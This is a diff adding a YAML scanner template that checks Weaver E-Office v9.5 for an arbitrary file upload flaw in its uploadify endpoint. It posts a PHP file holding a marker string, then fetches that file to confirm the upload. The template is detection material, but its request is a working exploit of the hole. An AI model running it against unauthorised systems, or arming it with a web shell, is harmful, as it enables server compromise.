@@ -1,0 +1,19 @@
+name: 泛微-EOffice-v9.5-uploadify-文件上传
+description: >
+  任意文件上传
+alwaysExecute: false
+matchCount: 2
+rules: 
+  - method: POST
+    path: /inc/jquery/uploadify/uploadify.php
+    search: '(?P<filename>\d{10})'
+    headers:
+      Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+    body: "--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"Rscan.php\"\r\nContent-Type: application/octet-stream\r\n\r\nRscan_test\r\n\r\n--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--\r\n--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85\r\nContent-Disposition: form-data; name=\"file\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--"
+    expression:
+      status: 200
+  - method: GET
+    path: /attachment/{{filename}}/Rscan.php
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]      
